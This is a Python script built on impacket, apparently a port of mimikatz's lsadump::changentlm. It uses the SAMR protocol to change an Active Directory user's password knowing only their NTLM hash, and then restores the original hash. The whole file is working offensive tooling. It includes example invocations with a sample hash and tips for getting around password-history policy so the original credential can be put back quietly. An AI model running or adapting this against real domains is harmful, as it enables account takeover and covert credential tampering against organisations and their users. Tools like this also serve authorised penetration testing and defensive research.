#!/usr/bin/env python3
#
# Description:
#   A script used to modify the user's password when only the
#   user's hash is known, and to restore the user's original
#   hash after the use is completed. Refer to mimikatz's
#   lsadump::changentlm module.
#
# Author:
#   Loong716 (@Loong716)
#
# Example:
#   (1) change user password:
#     $ python3 changentlm.py testad/test1:password -user targetuser -server DC01
#     -oldntlm bec067bcef8a518f39e40833796852a2 -newpass NewPassw0rd -dc-ip 192.168.100.1
#   (2) restore original ntlm hash:
#     $ python3 changentlm.py testad/test1:password -user targetuser -server DC01
#     -oldpass NewPassw0rd -newntlm bec067bcef8a518f39e40833796852a2 -dc-ip 192.168.100.1
#
# Notice:
#   If encounter a STATUS_PASSWORD_RESTRICTION error, it is because the
#   specified new password does not comply with the password policy. For
#   example, if 'Minimum password age' >= 1 day, the user's password can
#   be changed again after at least one day.
#   And if 'Enforce password history' >= 1, it cannot directly restore the
#   user's original hash, but you can try multiple changes to clear the
#   original password from the password history, then try to restore the
#   original password hash.
#
# Reference for:
#   SAMR
#

import re
import sys
import logging
import argparse

from impacket import version
from impacket import crypto, ntlm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples import logger
from impacket.dcerpc.v5 import transport, epm, samr


class CHANGENTLM:
    def __init__(self, username, password, domain, options = None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__targetuser = options.user
        self.__targetserver = options.server
        self.__oldntlm = None
        self.__newntlm = None
        self.__lmhash = ''
        self.__nthash = ''
        self.__targetIp = options.dc_ip
        self.__doKerberos = options.k
        self.__aeskey = options.aesKey
        self.__kdcHost = options.dc_host

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

        if self.__doKerberos and options.dc_host is None:
            raise ValueError("Kerberos auth requires DNS name of the target DC. Use -dc-host.")

        if options.old_pass is not None:
            self.__oldntlm = ntlm.NTOWFv1(options.old_pass)

        if options.new_pass is not None:
            self.__newntlm = ntlm.NTOWFv1(options.new_pass)

        if options.old_ntlm is not None:
            self.__oldntlm = bytes.fromhex(options.old_ntlm)

        if options.new_ntlm is not None:
            self.__newntlm = bytes.fromhex(options.new_ntlm)

    def newSamrChangePasswordUser(self, dce, userHandle, oldNT, newNT):
        request = samr.SamrChangePasswordUser()
        request['UserHandle'] = userHandle

        # It doesn't matter how much the user's LM hash is, so here's
        # the LM hash corresponding to the empty password.
        newLM = ntlm.LMOWFv1('')

        request['LmPresent'] = 0
        request['OldLmEncryptedWithNewLm'] = NULL
        request['NewLmEncryptedWithOldLm'] = NULL
        request['NtPresent'] = 1
        request['OldNtEncryptedWithNewNt'] = crypto.SamEncryptNTLMHash(oldNT, newNT)
        request['NewNtEncryptedWithOldNt'] = crypto.SamEncryptNTLMHash(newNT, oldNT)
        request['NtCrossEncryptionPresent'] = 0
        request['NewNtEncryptedWithNewLm'] = NULL
        request['LmCrossEncryptionPresent'] = 1
        request['NewLmEncryptedWithNewNt'] = crypto.SamEncryptNTLMHash(newLM, newNT)

        return dce.request(request)

    def init_samr(self):
        if self.__doKerberos:
            stringBinding = epm.hept_map(self.__kdcHost, samr.MSRPC_UUID_SAMR, protocol='ncacn_np')
        else:
            stringBinding = epm.hept_map(self.__targetIp, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_dport(445)
        rpctransport.setRemoteHost(self.__targetIp)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aeskey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        self.run_change(dce)

    def run_change(self, dce):
        userHandle = None
        serverHandle = None
        domainHandle = None

        try:
            logging.info("Connecting to Server {}...".format(self.__targetserver))

            samrConnectRep = samr.hSamrConnect5(dce, '{}\x00'.format(self.__targetserver),
                                                   samr.SAM_SERVER_CONNECT | samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN)
            serverHandle = samrConnectRep['ServerHandle']

            logging.info("Enumerating domains on target server...")
            samrEnumDomainRep = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = samrEnumDomainRep['Buffer']['Buffer']

            # Reference: https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py#L444
            domainsWithoutBuiltin = list(filter(lambda x: x['Name'].lower() != 'builtin', domains))

            if len(domainsWithoutBuiltin) > 1:
                domain = list(filter(lambda x: x['Name'].lower() == self.__domain, domains))
                if len(domain) != 1:
                    logging.critical("This server provides multiple domains and '%s' isn't one of them.",
                                     self.__domain)
                    logging.critical("Available domain(s):")
                    for domain in domains:
                        logging.error(" * %s" % domain['Name'])
                    raise Exception()
                else:
                    selectedDomain = domain[0]['Name']
            else:
                selectedDomain = domainsWithoutBuiltin[0]['Name']
            logging.info("Select domain: {}".format(selectedDomain))

            samrLookupDomainRep = samr.hSamrLookupDomainInSamServer(dce, serverHandle, selectedDomain)
            domainSID = samrLookupDomainRep['DomainId']

            logging.info("Try to Open domain {}...".format(selectedDomain))

            samrOpenDomainRep = samr.hSamrOpenDomain(dce, serverHandle, samr.DOMAIN_LOOKUP, domainSID)
            domainHandle = samrOpenDomainRep['DomainHandle']

            logging.info("Looking up user {}...".format(self.__targetuser))
            samrLookupNamesRep = samr.hSamrLookupNamesInDomain(dce, domainHandle, (self.__targetuser,))
            userRID = samrLookupNamesRep['RelativeIds']['Element'][0]

            logging.info("Open the handle to the user object...")
            samrOpenUserRep = samr.hSamrOpenUser(dce, domainHandle, samr.USER_CHANGE_PASSWORD, userRID)
            userHandle = samrOpenUserRep['UserHandle']

            try:
                changePasswdStatus = self.newSamrChangePasswordUser(dce, userHandle, self.__oldntlm, self.__newntlm)
            except samr.DCERPCSessionError as e:
                if e.error_code == 0xC000006A:
                    print('[-] STATUS_WRONG_PASSWORD. Wrong password.')
                elif e.error_code == 0xC000006C:
                    print('[-] STATUS_PASSWORD_RESTRICTION. Password does not meet requirements.')
                else:
                    print('[-] Error code: {}'.format(e.error_code))
            else:
                if changePasswdStatus['ErrorCode'] == 0:
                    print('[+] Change password success!')

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()

            logging.critical(str(e))
        finally:
            if userHandle is not None:
                samr.hSamrCloseHandle(dce, userHandle)
            if domainHandle is not None:
                samr.hSamrCloseHandle(dce, domainHandle)
            if serverHandle is not None:
                samr.hSamrCloseHandle(dce, serverHandle)
            dce.disconnect()

    def run(self):
        self.init_samr()


if __name__ == '__main__':

    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Change the domain user's hash and restore the original hash.")

    parser.add_argument('account', action='store', help='[domain/]username[:password] This user is '
                                                        'used to authenticate to DC.')
    parser.add_argument('-user', action='store', help='Target user you want to change its password.')
    parser.add_argument('-server', action='store', help='Target server\'s netbios name. If target '
                                                        'user is domain user, it should be DC.')
    parser.add_argument('-old-pass', action='store', help='The user\'s old plain-text password.')
    parser.add_argument('-old-ntlm', action='store', help='The user\'s old NTLM hash.')
    parser.add_argument('-new-pass', action='store', help='New plain-text password for target user.')
    parser.add_argument('-new-ntlm', action='store', help='New NTLM hash for target user.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on account parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-dc-ip', action='store', metavar="ip", help='IP of the domain controller to use. '
                                                                    'Useful if you can\'t translate the FQDN.'
                                                                    'specified in the account parameter will be used')
    group.add_argument('-dc-host', action='store', metavar="hostname", help='Hostname of the domain controller to use. '
                                                                            'If ommited, the domain part (FQDN) '
                                                                            'specified in the account parameter will be used')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = re.compile('(?:(?:([^/:]*)/)?([^:]*)(?::(.*))?)?').match(
        options.account).groups('')

    # If you use kerberos tickets, the domain name here needs to
    # correspond to the domain name in the ticket. otherwise an
    # KDC_ERR_PREAUTH_FAILED error will occur.
    if domain is None or domain == '':
        logging.critical('Domain name should be specified, If you use '
                         'kerberos tickets, you need to specify "domain/:"')
        sys.exit(1)

    if options.server is None or '.' in options.server:
        logging.critical('Target server\'s netbios name should be specified!')
        sys.exit(1)

    if options.user is None:
        logging.critical('Target username should be specified!')
        sys.exit(1)

    if options.old_pass is None and options.old_ntlm is None:
        logging.critical('Target user\'s old plain-text password or NTLM hash should be specified!')
        sys.exit(1)

    if options.new_pass is None and options.new_ntlm is None:
        logging.critical('Target user\'s new plain-text password or NTLM hash should be specified!')
        sys.exit(1)

    if options.dc_ip is None:
        logging.critical('Parameter -dc-ip should be specified!')
        sys.exit(1)

    executer = CHANGENTLM(username, password, domain, options)
    try:
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
